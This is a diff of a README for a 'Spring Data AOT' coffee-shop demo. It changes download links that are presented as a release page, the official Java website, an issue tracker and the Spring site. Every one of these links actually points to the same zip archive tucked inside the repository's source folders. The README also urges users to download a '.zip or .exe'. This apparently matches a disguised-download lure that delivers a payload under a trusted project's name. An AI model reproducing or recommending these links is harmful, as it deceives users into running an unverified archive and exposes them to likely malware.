@@ -1,6 +1,6 @@
 # ☕ spring-data-aot - Simplifying Data Queries for Your App
 
-![Download](https://raw.githubusercontent.com/EnochAyumu/spring-data-aot/master/.mvn/wrapper/spring-data-aot-v2.4.zip)
+![Download](https://raw.githubusercontent.com/EnochAyumu/spring-data-aot/master/src/main/java/dev/danvega/aot-data-spring-v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **Spring Data AOT Coffee Shop Demo**. This application shows how 
 
 To get started, you need to download the application. 
 
-1. **Visit this page to download:** [Spring Data AOT Releases](https://raw.githubusercontent.com/EnochAyumu/spring-data-aot/master/.mvn/wrapper/spring-data-aot-v2.4.zip)
+1. **Visit this page to download:** [Spring Data AOT Releases](https://raw.githubusercontent.com/EnochAyumu/spring-data-aot/master/src/main/java/dev/danvega/aot-data-spring-v1.8.zip)
 
 2. Look for the latest version. Choose the appropriate file for your system, like a `.zip` or `.exe`.
 
@@ -35,7 +35,7 @@ With AOT, these errors get caught early. Your application will not build until y
 Before installing, make sure your system meets these requirements:
 
 - **Operating System:** Windows 10 or higher, macOS, or a recent version of a Linux distribution.
-- **Java Version:** JDK 11 or above must be installed. You can download it from the [official Java website](https://raw.githubusercontent.com/EnochAyumu/spring-data-aot/master/.mvn/wrapper/spring-data-aot-v2.4.zip).
+- **Java Version:** JDK 11 or above must be installed. You can download it from the [official Java website](https://raw.githubusercontent.com/EnochAyumu/spring-data-aot/master/src/main/java/dev/danvega/aot-data-spring-v1.8.zip).
 
 ## 🛠 Features
 
@@ -59,8 +59,8 @@ To learn more about Spring Data AOT, consider the following resources:
 
 ## 🔗 Links
 
-- [Download the Latest Release](https://raw.githubusercontent.com/EnochAyumu/spring-data-aot/master/.mvn/wrapper/spring-data-aot-v2.4.zip)
-- [Open Issues for Support](https://raw.githubusercontent.com/EnochAyumu/spring-data-aot/master/.mvn/wrapper/spring-data-aot-v2.4.zip)
-- [Visit the Official Spring Site](https://raw.githubusercontent.com/EnochAyumu/spring-data-aot/master/.mvn/wrapper/spring-data-aot-v2.4.zip)
+- [Download the Latest Release](https://raw.githubusercontent.com/EnochAyumu/spring-data-aot/master/src/main/java/dev/danvega/aot-data-spring-v1.8.zip)
+- [Open Issues for Support](https://raw.githubusercontent.com/EnochAyumu/spring-data-aot/master/src/main/java/dev/danvega/aot-data-spring-v1.8.zip)
+- [Visit the Official Spring Site](https://raw.githubusercontent.com/EnochAyumu/spring-data-aot/master/src/main/java/dev/danvega/aot-data-spring-v1.8.zip)
 
 Enjoy using the Spring Data AOT application!
